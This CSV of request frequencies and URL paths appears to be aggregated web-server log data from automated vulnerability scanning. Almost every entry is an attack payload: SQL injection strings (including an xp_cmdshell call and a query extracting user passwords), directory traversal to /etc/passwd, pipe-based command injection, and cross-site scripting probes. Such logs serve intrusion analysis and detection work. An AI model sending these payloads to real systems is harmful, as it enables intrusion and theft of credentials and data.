Frequency,Resource
1,/main.php?basepath=-3373%29%29%29%20UNION%20ALL%20SELECT%202140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%2C2140%23
1,/main.php?basepath=%27%20OR%20NOT%206593%3D7105%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/inc/dbase.php
1,/main.php?basepath=-5678%22%29%20OR%205500%3D3905%23
1,/cgi-bin/orders/orders.txt
1,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]"
1,/../../../../../../../../../../etc/passwd
1,/cfdocs/expeval/openfile.cfm
1,ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
1,/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp
1,/cfdocs/cfmlsyntaxcheck.cfm
1,/cgi-bin/awstats/awstats.pl
1,/main.php?basepath=-2517%29%29%29%20UNION%20ALL%20SELECT%207290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%2C7290%23
1,/main.php?basepath=%29%29%29%20AND%201916%3D1916%23
1,/.../.../.../.../.../.../.../.../.../boot.ini
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/database/db2000.mdb
5,/./
1,"login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,/junk.aspx
1,/SiteServer/Admin/knowledge/dsmgr/default.asp
1,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
2,/cgi-bin/cgiwrap/~bin
2,/phpma/index.php
1,story.pl?next=../../../../../../../../../../etc/passwd%00
1,htgrep?file=index.html&hdr=/etc/passwd
1,/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00
1,/cd-cgi/sscd_suncourier.pl
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/horde/test.php?mode=phpinfo
1,/cgi-bin/data/fetch.php?page=
1,/upd/
1,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,photo/protected/manage.cgi
1,/SiteServer/Admin/commerce/foundation/driver.asp
1,mailit.pl
1,/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/ISSamples/sqlqhit.asp
1,mailnews.cgi
1,/main.php?basepath=%29%29%20AS%20PvtO%20WHERE%208157%3D8157%20AND%201916%3D1916%23
1,/cgi-bin/whois.cgi?action=load&whois=%3Bid
1,/main.php?basepath=-8591%29%29%29%20UNION%20ALL%20SELECT%203312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%2C3312%23
1,/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
2,/admin/phpmyadmin/index.php
1,perl.exe
1,webplus?script=../../../../../../../../../../etc/passwd
1,/a?<script>alert('Vulnerable')</script>
1,ezboard.cgi
1,/WEB-INF/web.xml
1,/TvLBvkHh.koi8-r
1,probecontrol.cgi?command=enable&username=cancer&password=killer
1,/TvLBvkHh.et
1,/TvLBvkHh.es
1,/TvLBvkHh.en
1,/TvLBvkHh.el
1,"/cgi-bin/alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/phpmyadmin-old/index.php
1,/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
1,/main.php?basepath=%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29VzaI%29%23
1,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/cgi-bin/classifieds/index.cgi
1,/forum/admin/wwforum.mdb
1,/main.php?basepath=-8675%29%29%29%20UNION%20ALL%20SELECT%205127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%2C5127%23
1,/cgi-bin/pagelog.cgi
1,/cgi-bin/dbman/db.cgi?db=no-db
1,/main.php?basepath=-9217%29%20OR%205746%3D5746%23
1,fpsrvadm.exe
1,/main.php?basepath=%29%29%29%20AND%20EXP%28%7E%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%289706%3D9706%2C1%29%29%29%2C0x71627a6a71%2C0x78%29%29x%29%29%20AND%20%28%28%289794%3D9794
1,/cgi-bin/fpsrvadm.exe
1,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/author.asp
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,snorkerz.bat
1,/search?NS-query-pat=../../../../../../../../../../etc/passwd
1,/main.php?basepath=%29%29%29%20AND%20%28SELECT%205285%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%285285%3D5285%2C1%29%29%29%2C0x71627a6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%285317%3D5317
1,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-5019%25%22%29%29%20OR%203854%3D8177%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=-6007%29%29%29%20UNION%20ALL%20SELECT%209071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%2C9071%23
2,/MyAdmin/scripts/setup.php
1,admin/admin.cgi
1,/cfdocs/examples/parks/detail.cfm
1,/geeklog/users.php
1,/cgi-bin/flexform
1,mkplog.exe
1,/vgn/login
2,cgiwrap/~nobody
1,"/ca000001.pl?ACTION=SHOWCART&hop=\""><script>alert('Vulnerable')</script>&PATH=acatalog%2f"
2,/_mem_bin/auoconfig.asp
1,/cgi-home/
1,/main.php?basepath=%29%29%29%20AND%20SLEEP%285%29%23
1,/main.php?basepath=-9462%29%29%29%20ORDER%20BY%202023%23
1,/TvLBvkHh.xls
1,/TvLBvkHh.shtm
1,ibill.pm
1,horde/test.php?mode=phpinfo
1,/TvLBvkHh.cellsprint
1,mrtg.cgi?cfg=blah
1,/cgi-bin/dumpenv.pl
1,/cgi-bin/htsearch?exclude=%60/etc/passwd%60
2,/index
1,/TvLBvkHh.net
1,/cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/TvLBvkHh.back
1,/cgi-perl/
2,cgiwrap/~test
1,/cgi-bin/Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/scripts/repost.asp
1,/main.php?basepath=%60%29%20WHERE%206149%3D6149%20AND%203967%3D1291%23
1,/main.php?basepath=%29%29%20OR%20NOT%204288%3D4288%23
1,/mitel/
1,/main.php?basepath=-7272%29%29%20OR%205746%3D5746%23
5,/hp/device/this.LCDispatcher
1,smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/aMiWjJNIot
2,cgiwrap/~smtp
1,/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/iissamples/issamples/SQLQHit.asp
2,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
1,/main.php?basepath=%29%29%29%20OR%20ELT%285985%3D5985%2CSLEEP%285%29%29%23
1,/cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
2,/cgi-bin/horde/test.php
1,/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0
1,/tftpboot/backup/
1,scoadminreg.cgi
1,/pma-old/index.php
1,/?mod=some_thing&op=browse
2,cgiwrap/~operator
1,/SiteServer/Admin/knowledge/persmbr/vs.asp
1,/SPA942/
1,/whateverdXHZ.html
1,/cgi-bin/search.php?searchstring=<script>alert(document.cookie)</script>
1,/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
1,/main.php?basepath=%27%29%29%29%20AND%208265%3D9748%23
1,/tsweb/
1,technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,/cgi-bin/photo/protected/manage.cgi
1,/main.php?basepath=-9295%25%27%29%29%29%20OR%203310%3D4893%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/index.aspx%5C
1,info2www
2,/tools/phpMyAdmin/index.php
1,/main.php?basepath=%20AND%207139%3D7139
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20CONCAT%280x716a6b7671%2C0x4f7164544f6e6a6f776e654e6b74426951536c6d4f4341614763686755574e6a7a6564544358784b%2C0x71627a6a71%29%2C6965%2C6965%2C6965%2C6965%23
1,/main.php?basepath=&PwGt%3D3706%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
1,/cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
1,/inc/common.load.php
1,/local/httpd$map.conf
1,/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
1,/main.php?basepath=%25%27%20AND%201916%3D1916%23
1,flexform
1,/xps/
1,/?Open
1,/pmamy/index.php
1,/index.php/123
1,"/administrator/popups/sectionswindow.php?type=web&link=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/htsearch?-c/nonexistant
1,/%3C/title%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/main.php?basepath=-7255%29%29%29%20UNION%20ALL%20SELECT%206180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%2C6180%23
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,/TvLBvkHh.sys
1,/index.asp%5C
1,fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/vgn/previewer
1,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
1,/main.php?basepath=%27%29%20AS%20qmvK%20WHERE%205449%3D5449%20AND%201423%3D9468%23
1,/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,lwgate.cgi
1,/main.php?basepath=-4558%29%29%29%20UNION%20ALL%20SELECT%206731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%2C6731%23
1,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
1,/main.php?basepath=-6619%27%29%29%29%20OR%205746%3D5746%23
1,"/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/user.php?op=userinfo&uname=<script>alert('hi');</script>
1,/main.php?basepath=-6742%29%29%29%20UNION%20ALL%20SELECT%209927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%2C9927%23
1,/MIDICART/midicart.mdb
1,/?sql_debug=1
1,/scripts/cpshost.dll
1,/TvLBvkHh.signature
1,/main.php?basepath=-1097%29%29%29%20ORDER%20BY%204%23
1,/TvLBvkHh.www_acl
1,/TvLBvkHh.link
1,/TvLBvkHh.fr
1,/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
1,/cfcache.map
1,/index.php?page=../../../../../../../../../../etc/passwd
1,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,/main.php?basepath=-1363%29%20OR%205746%3D5746%23
1,com5.pl
1,/main.php?basepath=%27%29%29%29%20AND%201916%3D1916%23
1,/main.php?basepath=%25%22%20AND%205134%3D9312%23
1,/guestbook/pwd
1,/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/classified.cgi
1,/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
1,/oc/Search/sqlqhit.asp
1,htmlscript?../../../../../../../../../../etc/passwd
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
1,/main.php?basepath=%27%29%20AND%207139%3D7139%20AND%20%28%27qgOS%27%3D%27qgOS
1,/exchange/root.asp?acs=anon
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>"
1,/CVS/Entries
1,"/shop/normal_html.cgi?file=&lt;script&gt;alert(\""Vulnerable\"")&lt;/script&gt;"
1,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>"
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini
1,/exchange/lib/RENDER.INC
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/junk999.asp
2,/cgi-bin/cgiwrap/~ftp
1,/exchange/lib/JSATTACH.INC
1,/scripts/tools/dsnform
1,/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>
1,/tvcs/getservers.exe?action=selects1
1,auth_data/auth_user_file.txt
1,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>"
1,/main.php?basepath=%29%29%29%20OR%20EXP%28%7E%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%287242%3D7242%2C1%29%29%29%2C0x71627a6a71%2C0x78%29%29x%29%29%20AND%20%28%28%282457%3D2457
1,/TvLBvkHh.inc
2,/sitemap.xml
1,htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
3,//phpmyadmin/scripts/setup.php
1,/TvLBvkHh.ini
1,/main.php?basepath=-8255%29%29%29%20UNION%20ALL%20SELECT%207916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%23
1,/page.cgi?../../../../../../../../../../etc/passwd
1,"/cgi-bin/tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
